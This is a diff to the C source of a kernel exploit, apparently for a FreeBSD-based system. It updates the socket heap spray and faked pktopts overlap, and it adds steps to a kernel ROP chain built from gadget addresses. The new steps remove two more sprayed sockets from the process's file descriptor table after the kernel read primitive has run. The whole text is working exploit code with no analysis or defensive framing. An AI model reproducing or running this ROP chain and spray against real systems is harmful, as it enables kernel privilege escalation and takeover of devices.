@@ -412,16 +412,19 @@ int main()
     if(overlap_idx < 0)
         return 1;
     int overlap_sock = spray_sock[overlap_idx];
+    int cleanup1 = overlap_sock;
     spray_sock[overlap_idx] = new_socket();
     overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, 0);
     printf("overlap_idx = %d\n", overlap_idx);
     if(overlap_idx < 0)
         return 1;
     overlap_sock = spray_sock[overlap_idx];
+    int cleanup2 = overlap_sock;
     spray_sock[overlap_idx] = new_socket();
     unsigned long long ptrs[2];
     int victim;
     leak_kevent_pktopts(&o, overlap_sock, ptrs);
+    set_rthdr(overlap_sock, NULL, 0); // clean up from the previous spray
     overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER_2, ptrs[1] + PKTOPTS_PKTINFO_OFFSET);
     printf("overlap_idx = %d\n", overlap_idx);
     if(overlap_idx < 0)
@@ -442,7 +445,7 @@ int main()
     stash_p[GP_REG_RBP] = 0;
     unsigned long long flag = 0;
     unsigned long long knote_0x40 = kread64(&o, victim, knote+0x40);
-    int leave = 174; // krop.length - 1
+    int leave = 182; // krop.length - 1
     unsigned long long krop[] = {
         0,
         __builtin_gadget_addr("cli"), // ensure we don't get preempted
@@ -533,7 +536,7 @@ int main()
         __builtin_gadget_addr("add rax, rcx"),
         __builtin_gadget_addr("mov rax, [rax]"),
         __builtin_gadget_addr("mov rax, [rax]"), // offsetof(struct filedesc, fd_ofiles) == 0
-        __builtin_gadget_addr("pop rdi"), // remove master_sock, overlap_sock, victim from the process' fd table
+        __builtin_gadget_addr("pop rdi"), // remove master_sock, overlap_sock, victim, cleanup1, cleanup2 from the process' fd table
         0,
         __builtin_gadget_addr("pop rcx"),
         8*(long long)master_sock,
@@ -545,6 +548,14 @@ int main()
         __builtin_gadget_addr("mov [rax], rdi"),
         __builtin_gadget_addr("pop rcx"),
         8*(long long)(victim-overlap_sock),
+        __builtin_gadget_addr("add rax, rcx"),
+        __builtin_gadget_addr("mov [rax], rdi"),
+        __builtin_gadget_addr("pop rcx"),
+        8*(long long)(cleanup1-victim),
+        __builtin_gadget_addr("add rax, rcx"),
+        __builtin_gadget_addr("mov [rax], rdi"),
+        __builtin_gadget_addr("pop rcx"),
+        8*(long long)(cleanup2-cleanup1),
         __builtin_gadget_addr("add rax, rcx"),
         __builtin_gadget_addr("mov [rax], rdi"),
         __builtin_gadget_addr("pop rdi"), // restore elf header
